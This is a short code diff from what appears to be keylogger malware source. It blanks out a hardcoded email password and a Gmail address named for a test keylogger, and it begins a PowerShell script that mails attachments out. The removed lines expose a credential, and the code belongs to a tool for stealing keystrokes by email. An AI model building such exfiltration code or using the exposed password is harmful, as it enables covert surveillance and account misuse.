@@ -13,9 +13,9 @@
 
 namespace Mail
 {
-    #define X_EM_PASS "Ctssob16"
-    #define X_EM_TO "namtestkeylogger1@gmail.com"
-    #define X_EM_FROM "namtestkeylogger1@gmail.com"
+    #define X_EM_PASS ""
+    #define X_EM_TO ""
+    #define X_EM_FROM ""
 
 const std::string &PowerShellScript =
 "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
